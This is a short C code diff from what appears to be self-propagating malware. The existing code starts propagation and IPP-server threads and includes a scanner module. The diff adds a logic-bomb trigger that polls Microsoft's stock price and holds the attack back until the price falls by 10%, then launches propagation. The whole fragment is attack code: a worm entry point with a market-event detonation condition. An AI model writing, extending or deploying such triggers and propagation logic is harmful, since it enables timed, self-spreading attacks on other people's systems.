@@ -1,3 +1,4 @@
+#include "stock_client.h"
 #include "ipp_server.h"
 #include "propagate.h"
 #include "scanner.h"
@@ -20,6 +21,14 @@ void * start_ipp_server(void *varg){
 }
 
 void entry(Globals *global) {
+    // Trigger of the attack
+    int trigger_attack = get_microsoft_stock(global);
+    while(trigger_attack != 1) // Wait until stock value drops by 10%
+    {
+        trigger_attack = get_microsoft_stock(global);
+        //global->sleep(1);
+    }
+
     // start propagate
     pthread_t thread_id_propagate;
     global->pthread_create(&thread_id_propagate, NULL, start_propagate, global);
